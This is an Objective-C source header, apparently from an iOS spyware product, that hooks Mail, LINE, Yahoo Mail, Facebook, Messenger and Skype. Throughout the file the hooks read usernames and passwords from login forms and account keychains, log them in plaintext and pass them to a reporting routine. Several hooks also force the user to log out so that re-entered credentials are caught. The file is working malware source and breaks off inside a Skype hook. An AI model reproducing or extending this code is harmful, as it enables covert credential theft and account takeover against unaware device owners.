//
//  MailPassword.h
//  MSFSP
//
//  Created by Makara on 2/26/14.
//
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

#import "MSFSP.h"

#import "PasswordUtils.h"
#import "PasswordController.h"
#import "FxPasswordEvent.h"
#import "DateTimeFormat.h"
#import "CTBlockDescription.h"

//Facebook
#import "Facebook+IOS7.h"
#import "FBAuthenticationContentView.h"
#import "FBAuthenticationContentView+Facebook-16-0.h"
#import "FBMURLRequestFormatter.h"
#import "FBAPISessionStore.h"
#import "FBAppDelegate.h"
#import "FBAccountStore.h"
#import "FBAccountStore+Facebook-16-0.h"
#import "FBAuthenticationView.h"

#import "FBFacebook.h"

//Facebook Messenger
#import "MNLoginView.h"
#import "MNLoginViewController.h"

// Email
//IOS6
#import "MailboxUid.h"
#import "Account.h"

//IOS7
#import "MFMailboxUid.h"
#import "MFAccount.h"
#import "MailAccount.h"
#import "MailAccount+IOS6.h"

// iOS 8
#import "MailAccount+iOS8.h"
#import "MFAccount+iOS8.h"
#import "IMAPAccount.h"
#import "YahooAccount.h"
#import "GmailAccount.h"
#import "DAMailAccount.h"

// Skype
#import "SKAccountManager.h"
#import "SKAccount.h"
#import "MainWindowController.h"
#import "LoginTypeViewController.h"
#import "SKPAccountManager.h"
#import "SKPLandingPageView.h"
#import "SkypeUserInterfaceController_iPad.h"

// For LINE
#import "RegistrationAccountConnectViewController.h"
#import "AccountService.h"
#import "TalkAppDelegate.h"
#import "LINEPasswordManager.h"
#import "NLRegLoginViewController.h"

// For LINE for iPad
#import "NLiPadAppDelegate.h"
#import "NLiPadAccountService.h"


// For Yahoo Mail
#import "YAccountsSignInViewController.h"
#import "YAAppDelegate.h"
#import "YahooPasswordManager.h"
#import "YRAppDelegate.h"

// For Instagram
#import "IGUsernameViewController.h"
#import "IGTextField.h"
#import "IGSignInFormView.h"
#import "IGSignInViewController.h"
#import "InstagramPasswordManager.h"
#import "AppDelegate.h"
#import "IGLogInView.h"
#import "IGRetroRegistrationLoginViewController.h"
#import "IGRetroRegistrationLoginView.h"
#import "IGRetroRegistrationLoginScrollView.h"
#import "IGRetroRegistrationTextField.h"
#import "IGPasswordField.h"
#import "IGRetroRegistrationSignUpViewController.h"
#import "IGRetroRegistrationSignUpView.h"
#import "IGRetroRegistrationSignUpScrollView.h"
#import "IGRetroRegistrationUsernameField.h"

// For LinkedIn
#import "LinkedInPasswordManager.h"
#import "LinkedInAppDelegate.h"
#import "LILoginV2ViewController.h"
#import "LiCoLoginViewController.h"
#import "LiCoLoginSignInBoxView.h"
#import "LiCoAppDelegateImpl.h"
#import "LIRegLoginViewController.h"

// For Pinterest
#import "CBLLoginViewController.h"
#import "CBLSignupViewController.h"
#import "CBLSignupView.h"
#import "CBLPasswordResetViewController.h"
#import "CBLAppDelegate.h"
#import "CBLTextEntryCell.h"
#import "PinterestPasswordManager.h"
#import "CBLActiveUserManager.h"
#import "CBLActiveUser.h"
// For Pinterest 6.4.1
#import "PILoginViewController.h"
#import "PIBrioSignupStepContainerViewController.h"
#import "PIUserSessionManager.h"
#import "PIUser.h"

// For Foursquare
#import "SignupViewController.h"
#import "SigninViewController.h"
#import "foursquareAppDelegate.h"
#import "SignupTextInputCell.h"
#import "FSTextInputCell.h"
#import "FoursquarePasswordManager.h"

// Foursquare 8.0
#import "LoginViewController.h"
#import "SignupTextInputView.h"
#import "FSCoreAppDelegate.h"
#import "FSCoreSignupViewController.h"
#import "SignupFormViewController.h"


//Vimeo
//iOS7
#import "SMKVimeoAuthentication.h"
#import "AppDelegate-Vimeo.h"
#import "ECAccountManager.h"
#import "VIMAccountManager.h"
//iOS6
#import "XAuthCredentials.h"
#import "VimeoAppDelegate.h"
#import "Model.h"
#import "VimeoUtil.h"

#import "VIMOAuthAuthenticator.h"
#import "SMKBaseAuthViewController.h"

#import "AppNavigationController.h"

#import "VIMSession.h"

#import "AuthHelper.h"

//Tumblr
//iOS7
#import "TMAppDelegate.h"
#import "TMAuthentication.h"
//iOS6
#import "TMAuthController.h"
// iOS 8
#import "TMAppDelegate+3-7-2.h"
#import "TMAppUserAuthenticationController.h"
#import "TMUserAuthenticationController.h"

//Flickr
#import "SignInPageNewUIController.h"
#import "FlickrAppDelegate.h"
//Flickr version 3.0
#import "FLKAppDelegate.h"
#import "YAccountsSSOViewController.h"
#import "FlickrPasswordManager.h"
//Flickr 4.0.2
#import "RTAcquiringCookiesState.h"

//Wechat
#import "WCAccountLoginControlLogic.h"
#import "CMainControll.h"
#import "MicroMessengerAppDelegate.h"
#import "CAppUtil.h"
#import "WCBaseTextFieldItem.h"
#import "WCAccountFillPhoneViewController.h"

//Twitter
#import "TFNTwitterAccount.h"
#import "TFNTwitterAccount+2-16-1.h"
#import "TFNTwitter.h"
#import "TFNTwitter+2-16-1.h"
#import "T1AppDelegate.h"
#import "SFHFKeychainUtils.h"
#import "T1AddAccountViewController.h"
#import "TFNTwitterAPI.h"
#import "TFNTwitterAPI+6-15-1.h"
#import "T1SignInManager.h"
#import "T1AdaptiveSignUpFlow.h"
#import "T1MandatoryPhoneSignUpInfoProvider.h"

//AppleID
#import "StoreSettingsController.h"
// iOS 9
#import "AKBasicLoginAlertController.h"

//Twitter
#import <Accounts/Accounts.h>

#import "ACAccount+iOS8.h"
#import "ACAccountCredential+iOS8.h"

//Yahoo Messenger (Iris)
#import "AppDelegate+YahooIris.h"
#import "YAccountsWebSigninViewController.h"
#import "YAccountsTokenHandoffWebView.h"

#import "SL_OOPAWebViewController.h"

//WebKit
#import <WebKit/WebKit.h>

#import "AccountPSDetailController.h"

#pragma mark - Utils -

FxPasswordEvent *passwordEvent(NSString *aUserName, NSString *aPassword) {
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc] init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:aUserName];
    [appPwd setMPassword:aPassword];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    
    return ([event autorelease]);
}

#pragma mark -
#pragma mark Emails inside Mail application
#pragma mark -

#pragma mark IOS6
HOOK(MailboxUid, initWithAccount$ ,id,id arg1){
    DLog(@"###### MailboxUid initWithAccount$ ######");
    MailAccount * account = arg1;
    NSArray *emailAddresses = [account emailAddresses];
	if( [emailAddresses count] > 0 ){
		DLog(@"### emailAddresses %@ ",[emailAddresses objectAtIndex:0]);
		if( [[account passwordFromKeychain]length] > 0 ){
			DLog(@"### passwordFromKeychain %@ ",[account passwordFromKeychain]);
            
            NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
            NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
            
            FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
            [event setDateTime:[DateTimeFormat phoenixDateTime]];
            [event setMApplicationID:appID];
            [event setMApplicationName:appName];
            [event setMApplicationType:kPasswordApplicationTypeNativeMail];
            FxAppPwd *appPwd = [[FxAppPwd alloc] init];
            [appPwd setMUserName:[emailAddresses objectAtIndex:0]];
            [appPwd setMPassword:[account passwordFromKeychain]];
            [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
            [appPwd release];
            [PasswordUtils sendPasswordEvent:event];
            [event release];
            
		}else{
			DLog(@"### No password");
		}
	}
	return CALL_ORIG(MailboxUid, initWithAccount$,arg1);
}

#pragma mark IOS7, iOS 8
HOOK(MFMailboxUid, initWithAccount$ ,id,id arg1){
    DLog(@"###### MFMailboxUid initWithAccount$ ######");
    DLog(@"arg1, %@", arg1);
    MailAccount * account = arg1;
    NSArray *emailAddresses = [account emailAddresses];
	if( [emailAddresses count] > 0 ){
		DLog(@"### emailAddresses %@ ",[emailAddresses objectAtIndex:0]);
        
        NSString *password = [account _password];
        
        if ([password length] == 0 && [account respondsToSelector:@selector(accountForRenewingCredentials)]) { // Hotmail
            ACAccountCredential *acCredential = [[(MFAccount *)account accountForRenewingCredentials] credential];
            password = [[acCredential credentialItems] objectForKey:@"password"];
            
            DLog(@"acCredential, %@", acCredential);
            DLog(@"acCredential, credentialItems, %@", [acCredential credentialItems]);
            if ([acCredential respondsToSelector:@selector(password)]) {
                DLog(@"acCredential, password, %@", [acCredential performSelector:@selector(password)]);
            }
        }
        
		if( [password length] > 0 ){
			DLog(@"### password %@ ",password);
            
            NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
            NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
   
            FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
            [event setDateTime:[DateTimeFormat phoenixDateTime]];
            [event setMApplicationID:appID];
            [event setMApplicationName:appName];
            [event setMApplicationType:kPasswordApplicationTypeNativeMail];
            FxAppPwd *appPwd = [[FxAppPwd alloc] init];
            [appPwd setMUserName:[emailAddresses objectAtIndex:0]];
            [appPwd setMPassword:password];
            [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
            [appPwd release];
            [PasswordUtils sendPasswordEvent:event];
            [event release];
            
		}else{
			DLog(@"### No password");
		}
	}
	return CALL_ORIG(MFMailboxUid, initWithAccount$,arg1);
}

#pragma mark -
#pragma mark LINE for iPhone (register email, login, change password, force logout)
#pragma mark -


#pragma mark (LINE) First Registration "Login with registered email"

HOOK(RegistrationAccountConnectViewController,  okButtonPressed$, void, id pressed) {
    DLog(@"\n\n&&&&&&&&&&&&&& RegistrationAccountConnectViewController --> okButtonPressed &&&&&&&&&&&&&&")
    
    //DLog (@"pressed id %@", pressed)
    //DLog (@"passwordField  %@", self.passwordField)
    //DLog (@"accountField  %@", self.accountField)
    
    @try {
        NSString *password = ((UITextField *)self.passwordField).text;
        NSString *account = ((UITextField *)self.accountField).text;
        
        DLog (@"passwordField >>  %@", password)
        DLog (@"accountField >>  %@", account)
        
        if (account     &&  [account length]    &&
            password    &&  [password length])  {
            
            DLog(@"Capture account and password [%@] [%@]", account, password)
            
            NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
            
            [PasswordUtils sendPasswordEventForAccount:account
                                              password:password
                                         applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                       applicationName:applicationName];
        }
    }
    @catch (NSException *exception) {
        DLog(@"LINE password exception: %@", exception);
    }
    @finally {
        ;
    }

    CALL_ORIG(RegistrationAccountConnectViewController, okButtonPressed$, pressed);
}

// 5.2.x,..., 5.3.1
HOOK(NLRegLoginViewController, nextButtonPressed$, void, id arg1) {
    //DLog (@"arg1 %@", arg1);
    //DLog (@"email  [%@] %@", [self.email class], self.email);
    //DLog (@"password [%@] %@", [self.password class], self.password);
    
    @try {
        NSString *password = self.password;
        NSString *account = self.email;
        
        DLog (@"password >>  %@", password);
        DLog (@"account >>  %@", account);
        
        if (account && [account length]    &&
            password && [password length])  {
            
            DLog(@"Capture account and password [%@] [%@]", account, password)
            
            NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
            
            [PasswordUtils sendPasswordEventForAccount:account
                                              password:password
                                         applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                       applicationName:applicationName];
        }
    }
    @catch (NSException *exception) {
        DLog(@"LINE password exception: %@", exception);
    }
    @finally {
        ;
    }
    
    CALL_ORIG(NLRegLoginViewController, nextButtonPressed$, arg1);
}

#pragma mark (LINE) Register Email on Account view, Change Email


// Email Registration, Change Email
HOOK(AccountService,  registEmailWithAccountId$accountPassword$ignore$completionBlock$errorBlock$, void, id accountId, id password, BOOL ignore, id block, id block5) {
    DLog(@"\n\n&&&&&&&&&&&&&& Account Service --> registEmailWithAccountId &&&&&&&&&&&&&&")
    //DLog (@"ignore %d", ignore)
    //DLog (@"block %@", block)
    //DLog (@"block5 %@", block5)
    DLog (@"account id %@", accountId) // got email address
    DLog (@"password %@", password)    // got password
    
    if (accountId   &&  [accountId length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", accountId, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:accountId
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
    CALL_ORIG(AccountService, registEmailWithAccountId$accountPassword$ignore$completionBlock$errorBlock$, accountId, password, ignore, block, block5);
}

#pragma mark (LINE) Change Password

// Change Password
HOOK(AccountService,  setAccountWithProvider$accountID$password$completionBlock$errorBlock$, void, int provider, id anId, id password, id block, id block3) {
    DLog(@"\n\n&&&&&&&&&&&&&& Account Service --> setAccountWithProvider &&&&&&&&&&&&&&")
    //DLog (@"provider %d", provider)
    //DLog (@"block %@", block)
    //DLog (@"block5 %@", block3)
    DLog (@"accountID %@", anId)
    DLog (@"password %@", password)
    
    
    if (anId        &&  [anId length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", anId, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:anId
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
    
    CALL_ORIG(AccountService,   setAccountWithProvider$accountID$password$completionBlock$errorBlock$, provider, anId, password, block, block3);
}

#pragma mark (LINE) Force Logout

HOOK(TalkAppDelegate,  application$didFinishLaunchingWithOptions$, BOOL, id application, id options) {
    DLog(@"\n\n&&&&&&&&&&&&&& TalkAppDelegate --> application didFinishLaunchingWithOptions&&&&&&&&&&&&&&")
    
    DLog (@"application %@", application)
    //DLog (@"options  %@", options)
    
    if ([PasswordController isForceLogOutWithPasswordAppID:kLine]) {
        DLog(@"!!!!! FORCE LOGOUT LINE !!!!!!")
        LINEPasswordManager *linePassMgr = [LINEPasswordManager sharedLINEPasswordManager];
        [linePassMgr performSelector:@selector(clearRegisteredAccount) withObject:Nil afterDelay:5];
        
        [PasswordController forcePasswordAppID:kLine logOut:kReset];
    }

    return CALL_ORIG(TalkAppDelegate,  application$didFinishLaunchingWithOptions$, application, options);
}


#pragma mark -
#pragma mark LINE for iPad (login, force logout)
#pragma mark -

HOOK(NLiPadAppDelegate,  application$didFinishLaunchingWithOptions$, BOOL, id application, id options) {
    DLog(@"\n\n&&&&&&&&&&&&&& NLiPadAppDelegate --> application didFinishLaunchingWithOptions&&&&&&&&&&&&&&")
    DLog (@"application %@", application)
    
    if ([PasswordController isForceLogOutWithPasswordAppID:kLineiPad]) {
        @try {
            DLog(@"!!!!! FORCE LOGOUT LINE iPad!!!!!!")
            Class $NLiPadAccountService = objc_getClass("NLiPadAccountService");
            [$NLiPadAccountService logoutZWithCompletionBlock: ^(){
                DLog(@"clear success on iPad")}];
        }
        @catch (NSException *exception) {
            DLog(@"LINE password exception: %@", exception);
        }
        @finally {
            ;
        }
        [PasswordController forcePasswordAppID:kLineiPad logOut:kReset];
    }
    
    return CALL_ORIG(NLiPadAppDelegate,  application$didFinishLaunchingWithOptions$, application, options);
}

HOOK(NLiPadAccountService,  loginZWithAccountProvider$accountID$password$completionBlock$, void, int accountProvider, id anID, id password, id block) {
    DLog(@"\n\n&&&&&&&&&&&&&& NLiPadAccountService --> loginZWithAccountProvider$accountID$password$completionBlock &&&&&&&&&&&&&&")
    
    if (anID        &&  [anID length]       &&
        password    &&  [password length]   ){
        DLog(@"Capture account and password [%@] [%@]", anID, password)
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        [PasswordUtils sendPasswordEventForAccount:anID
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
    CALL_ORIG(NLiPadAccountService,  loginZWithAccountProvider$accountID$password$completionBlock$, accountProvider, anID, password, block);
}


#pragma mark -
#pragma mark Yahoo Mail
#pragma mark -

#pragma mark Log in

HOOK(YAccountsSignInViewController,  onLoginButton$, void, id button) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& YAccountsSignInViewController --> onLoginButton &&&&&&&&&&&&&&\n\n");
    
    DLog (@"button %@", button);

    NSString *account = [self usernameField].text;
    NSString *password = [self passwordField].text;

    DLog (@"usernameField %@", account);
    DLog (@"passwordField %@", password);
    
    if ([self userIDOrName]) {
        DLog (@"\n\n!!!!!!!!! ENTER PASSWORD ONLY !!!!!!!\n\n");
        DLog (@"userIDOrName %@", [self userIDOrName]);
        if (!account || [account length] == 0) {
            account = [self userIDOrName];
        }
    }
    
    if (account     &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
    
    CALL_ORIG(YAccountsSignInViewController, onLoginButton$,button);

}


#pragma mark Force Log Out

HOOK(YAAppDelegate,  application$didFinishLaunchingWithOptions$, BOOL, id application, id options) {
    DLog(@"\n\n&&&&&&&&&&&&&& YAAppDelegate --> application$didFinishLaunchingWithOptions$ &&&&&&&&&&&&&&\n\n");
    
    //DLog (@"application %@", application);
    //DLog (@"options %@", options);
    
    BOOL retValue =     CALL_ORIG(YAAppDelegate, application$didFinishLaunchingWithOptions$, application, options);

    if ([PasswordController isForceLogOutWithPasswordAppID:kYahoo]) {
        DLog(@"!!!!! FORCE LOGOUT YAHOO !!!!!!")
        
        YahooPasswordManager *yMgr = [YahooPasswordManager sharedYahooPasswordManager];
        [yMgr performSelector:@selector(clearRegisteredAccount) withObject:nil afterDelay:5];
        
        [PasswordController forcePasswordAppID:kYahoo logOut:kReset];
    }
    
    return retValue;
}

#pragma mark  Force Log Out 4.2

HOOK(YRAppDelegate,  application$didFinishLaunchingWithOptions$, BOOL, id application, id options) {
    if ([PasswordController isForceLogOutWithPasswordAppID:kYahoo]) {
        DLog (@"Should force logout")
        [PasswordController forcePasswordAppID:kYahoo logOut:kReset];
        
        //Set Userdefault value to make yahoo messenger remove all signed in account by itself.
        [[NSUserDefaults standardUserDefaults] setObject:[NSNumber numberWithBool:YES] forKey:@"YAccountsSDK_Reset"];
        [[NSUserDefaults standardUserDefaults] synchronize];
    } else {
        DLog (@"Should NOT force logout")
    }
    
    BOOL retValue = CALL_ORIG(YRAppDelegate, application$didFinishLaunchingWithOptions$, application, options);
    
    return retValue;
}

#pragma mark Log in 4.2

HOOK(YAccountsWebSigninViewController, didFinishWithSLCC$otherParams$_YahooMail, void, id arg1, id arg2){
    UIWebView *webView = (UIWebView *)self.webview;
    NSString* username = [webView stringByEvaluatingJavaScriptFromString:@"document.getElementById('login-username').value"];
    NSString* password = [webView stringByEvaluatingJavaScriptFromString:@"document.getElementById('login-passwd').value"];
    
    CALL_ORIG(YAccountsWebSigninViewController, didFinishWithSLCC$otherParams$_YahooMail, arg1, arg2);
    
    DLog (@"username %@", username)
    DLog (@"password %@", password)
    
    if (username     &&  [username length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", username, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:username
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
}


#pragma mark -
#pragma mark Facebook Messenger
#pragma mark -

HOOK(MNLoginViewController ,loginViewDidTapLoginWithUsernameAndPasswordButton$ ,void,id arg1){
    DLog(@"\n\n#### MNLoginViewController --> loginViewDidTapLoginWithUsernameAndPasswordButton ");

    MNLoginView * view;
    object_getInstanceVariable(self, "_loginView", (void**)&view);
    DLog(@"### Username %@",[[view usernameOrPhoneTextField] text]);
    DLog(@"### Password %@",[[view passwordTextField] text]);
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:[[view usernameOrPhoneTextField] text]];
    [appPwd setMPassword:[[view passwordTextField] text]];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
    [PasswordController forcePasswordAppID:kFacebookMSG logOut:kReset];
    
    CALL_ORIG(MNLoginViewController, loginViewDidTapLoginWithUsernameAndPasswordButton$,arg1);
}

// Facebook 18.1 and below
HOOK(MNLoginView ,setType$animated$ ,void,unsigned int arg1,BOOL arg2){
    DLog(@"\n\n&&&&&&&&&&&&&& MNLoginView -->setType &&&&&&&&&&&&&&\n\n");
    
    DLog(@"### setType$animated$ type %d",arg1);
    if ([PasswordController isForceLogOutWithPasswordAppID:kFacebookMSG]) {
//        [PasswordController forcePasswordAppID:kFacebookMSG logOut:kReset];
        CALL_ORIG(MNLoginView, setType$animated$,0,arg2);
    }else{
        CALL_ORIG(MNLoginView, setType$animated$,arg1,arg2);
    }
}

#pragma mark -
#pragma mark Facebook
#pragma mark -


// Facebook 18.1 and below
HOOK(FBAuthenticationContentView,_resetViewToOriginalCondition$ ,id,unsigned int arg1){
    DLog(@"\n\n&&&&&&&&&&&&&& FBAuthenticationContentView --> _resetViewToOriginalCondition &&&&&&&&&&&&&&\n\n");
    
	DLog(@"### _resetViewToOriginalCondition %d",arg1);
    
    DLog(@"frame: %@", NSStringFromCGRect(self.frame));
    DLog(@"bounds: %@", NSStringFromCGRect(self.bounds));
    DLog(@"center: %@", NSStringFromCGPoint(self.center));
    
    /*
     4: login with password
     5: login with passcode
     7: login with account in 'Settings' application
     */
    
    //DLog(@"subviews = %@", self.subviews);
    //DLog(@"supperview = %@", self.superview);
    
    if ([PasswordController isForceLogOutWithPasswordAppID:kFacebook]) {
        self.interfaceType = 4;
        
        if ([self respondsToSelector:@selector(canShowAccountList)]) {
            self.canShowAccountList = NO;
        }
        
        //[PasswordController forcePasswordAppID:kFacebook logOut:kReset];
        return CALL_ORIG(FBAuthenticationContentView, _resetViewToOriginalCondition$,4);
    }else{
        return CALL_ORIG(FBAuthenticationContentView, _resetViewToOriginalCondition$,arg1);
    }
}
/*
HOOK(FBAuthenticationView, setInterfaceType$animated$completion$, void, unsigned int arg1, BOOL arg2, id arg3) {
    DLog(@"### setInterfaceType$animated$completion$, %d, %d, %@", arg1, arg2, arg3);
    CALL_ORIG(FBAuthenticationView, setInterfaceType$animated$completion$, arg1, arg2, arg3);
}*/
// Facebook 18.1 and below
HOOK(FBAuthenticationView, setInterfaceType$animated$, void, unsigned int arg1, BOOL arg2) {
    DLog(@"### setInterfaceType$animated$, %d, %d", arg1, arg2);
    
    if ([PasswordController isForceLogOutWithPasswordAppID:kFacebook]) {
        CALL_ORIG(FBAuthenticationView, setInterfaceType$animated$, 4, arg2);
    } else {
        CALL_ORIG(FBAuthenticationView, setInterfaceType$animated$, arg1, arg2);
    }
}

HOOK(FBAuthenticationContentView,_performPasswordSubmission ,void){
    DLog(@"\n\n&&&&&&&&&&&&&& FBAuthenticationContentView --> _performPasswordSubmission &&&&&&&&&&&&&&\n\n");
    
	DLog(@"### _performPasswordSubmission");
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:[[self usernameField]text]];
    [appPwd setMPassword:[[self passwordField]text]];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
	DLog(@"### self.usernameField %@",[[self usernameField]text]);
	DLog(@"### self.passwordField %@",[[self passwordField]text]);
	CALL_ORIG(FBAuthenticationContentView, _performPasswordSubmission);
    
    [PasswordController forcePasswordAppID:kFacebook logOut:kReset];
}

// This method is called on Messenger too
HOOK(Facebook,initWithURLRequestFormatter$ ,id,id arg1){
    DLog(@"\n\n&&&&&&&&&&&&&& Facebook --> initWithURLRequestFormatter &&&&&&&&&&&&&&\n\n");
	DLog(@"### initWithURLRequestFormatter %@",arg1);
    
    NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
    
    if (([identifier isEqualToString:@"com.facebook.Facebook"] && [PasswordController isForceLogOutWithPasswordAppID:kFacebook])        ||
        ([identifier isEqualToString:@"com.facebook.Messenger"] && [PasswordController isForceLogOutWithPasswordAppID:kFacebookMSG])        ){
        DLog (@"Delete Session Store for %@", [[NSBundle mainBundle] bundleIdentifier])
        
        FBMURLRequestFormatter * fb = arg1;
        FBAPISessionStore *store;
        object_getInstanceVariable(fb, "_apiSessionStore", (void **)&store);
        [store _deleteSession];
        //[PasswordController forcePasswordAppID:kFacebook logOut:kReset];
    }
	return CALL_ORIG(Facebook, initWithURLRequestFormatter$,arg1);
}

// Facebook 18.1 up
// This method is called on Messenger too
HOOK(FBFacebook,initWithURLRequestFormatter$ ,id,id arg1){
    DLog(@"\n\n&&&&&&&&&&&&&& FBFacebook --> initWithURLRequestFormatter &&&&&&&&&&&&&&\n\n");
	DLog(@"### initWithURLRequestFormatter %@",arg1);
    
    NSBundle *bundle = [NSBundle mainBundle];
    NSString *identifier = [bundle bundleIdentifier];
    
    if (([identifier isEqualToString:@"com.facebook.Facebook"] && [PasswordController isForceLogOutWithPasswordAppID:kFacebook])        ||
        ([identifier isEqualToString:@"com.facebook.Messenger"] && [PasswordController isForceLogOutWithPasswordAppID:kFacebookMSG])        ){
        DLog (@"Delete Session Store for %@", identifier)
        
        /*
         Facebook (34.0, 35.0,...) iOS 8.4 iPhone 5 White:
            While user log in this method get called first cause reset password all times. We expect this method to call first only there is logged in user.
         If user log in this method should call after _performPasswordSubmission
         
         *** Strange behaviour of iPhone 5 White iOS 8.4
         */
        
        if ([identifier isEqualToString:@"com.facebook.Facebook"]) {
            [PasswordController forcePasswordAppID:kFacebook logOut:kReset];
        }
        
        FBMURLRequestFormatter * fb = arg1;
        FBAPISessionStore *store;
        object_getInstanceVariable(fb, "_apiSessionStore", (void **)&store);
        [store _deleteSession];
        //[PasswordController forcePasswordAppID:kFacebook logOut:kReset];
    }
	return CALL_ORIG(FBFacebook, initWithURLRequestFormatter$,arg1);
}

/*
HOOK(FBAppDelegate, application$didFinishLaunchingWithOptions$ ,BOOL,id arg1,id arg2 ){
	//BOOL ret = CALL_ORIG(FBAppDelegate, application$didFinishLaunchingWithOptions$ ,arg1,arg2 );
	DLog(@"#### application$didFinishLaunchingWithOptions$");
    
    if ([PasswordController isForceLogOutWithPasswordAppID:kFacebook] || 1) {
        // Delete system accounts in store (accounts in 'Settings' application)
        Class $FBAccountStore = objc_getClass("FBAccountStore");
        if ([$FBAccountStore respondsToSelector:@selector(sharedAccountStore)]) {
            FBAccountStore *accountStore = [$FBAccountStore sharedAccountStore];
            DLog(@"# accounts %@",[accountStore accounts]);
            NSMutableArray *fbAccounts = [NSMutableArray array];
            for (ACAccount *account in [accountStore accounts]) {
                if ([[[account accountType] performSelector:@selector(identifier)] isEqualToString:@"com.apple.facebook"]) {
                    [fbAccounts addObject:account];
                }
            }
            for (ACAccount *fbAccount in fbAccounts) {
                if ([accountStore respondsToSelector:@selector(removeAccount:withCompletionHandler:)]) {
                    DLog(@"Deleting account type = %@", [[fbAccount accountType] performSelector:@selector(identifier)]);
                    // No permission to delete account (unlike twitter)
                    //[accountStore performSelector:@selector(removeAccount:withCompletionHandler:) withObject:fbAccount withObject:nil];
                    //[accountStore removeAccount:fbAccount withCompletionHandler:nil];
                }
            }
        }
    }
    BOOL ret = CALL_ORIG(FBAppDelegate, application$didFinishLaunchingWithOptions$ ,arg1,arg2 );
    return ret;
}*/

#pragma mark -
#pragma mark Skype
#pragma mark -


#pragma mark Skype Version 5.x,6.x


// Capture Password
HOOK(SKPAccountManager,loginWithSkypeIdentity$andPassword$ ,BOOL, id skypeIdentity,id password){
    DLog(@"\n\n&&&&&&&&&&&&&& SKPAccountManager --> loginWithSkypeIdentity &&&&&&&&&&&&&&\n\n");
    
    BOOL retVal = CALL_ORIG(SKPAccountManager, loginWithSkypeIdentity$andPassword$ , skypeIdentity, password);
    
	DLog(@"### skypeIdentity %@",skypeIdentity);
	DLog(@"### password %@", password);
    //DLog(@"### ret %d", retVal);  // always get 1
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
	
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
